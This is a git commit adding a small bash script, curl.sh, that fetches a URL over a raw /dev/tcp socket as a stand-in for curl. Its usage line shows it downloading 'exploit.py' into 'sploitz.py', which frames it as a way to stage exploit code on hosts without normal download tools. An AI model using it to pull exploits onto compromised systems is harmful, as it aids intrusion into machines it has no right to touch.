6112a10385f49cdba9fa2294cfebdd3d74342b0a
Jackmeister <78603128+J4CKMEISTER@users.noreply.github.com>
2023-03-21 10:27:34 +0800

    Update and rename test to curl.sh

---
+++ Scripts/curl.sh
@@ -0,0 +1,19 @@
+# USAGE: curl.sh http://www.example.com/exploit.py > sploitz.py
+
+#!/bin/bash
+function __curl() {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+
+__curl $1
